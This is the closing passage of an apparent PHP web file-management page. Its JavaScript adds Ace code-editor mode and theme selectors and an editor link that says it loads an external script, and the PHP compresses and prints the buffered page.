	aceEditorModeSelect = buildSelectFor(aceEditorModes, '<?=$GLOBALS['ACECONF']['MODE']?>', 'aceEditor[\'' + eId + '\'].session.setMode(\'ace/mode/\' + this.value);');
	aceEditorThemeSelect = buildSelectFor(aceEditorThemes, '<?=$GLOBALS['ACECONF']['THEME']?>', 'aceEditor[\'' + eId + '\'].setTheme(\'ace/theme/\' + this.value);');
	
	flexRow.insertBefore(aceEditorModeSelect, flexRow.children[1]);
    flexRow.insertBefore(aceEditorThemeSelect, flexRow.children[1]);
}

function buildSelectFor(array, selected = '', onChange = ''){
	var select = document.createElement('select');
	select.setAttribute('onchange', onChange);
	array.forEach(function(item){
		var option = document.createElement('option');
		option.value = option.textContent = item;
		if(item == selected) option.selected = true;
		select.appendChild(option);
	});
	
	return select;
}

document.getElementById('tmplFrmFile').innerHTML = document.getElementById('tmplFrmFile').innerHTML.replace(/<\/a><\/div>/g,'</a> <a href="#"class="cntrl" onmouseover="if(typeof ace != \'undefined\') this.title = \'\'"  title="Code Editor&#x000a;&#x000a;After clicking, the EXTERNAL JS file will be loaded:&#x000a;&#x000a;<?=$GLOBALS['ACECONF']['URL']?>" onclick="aceEditorProcess(this);return false"><small>E</small></a></div>'); 
</script>
<?php } ?>
<?=paramsHandlerJS()?>
</html>
<?php $out = ob_get_contents(); ob_end_clean(); ob_start('ob_gzhandler'); print makeOut($out); die;
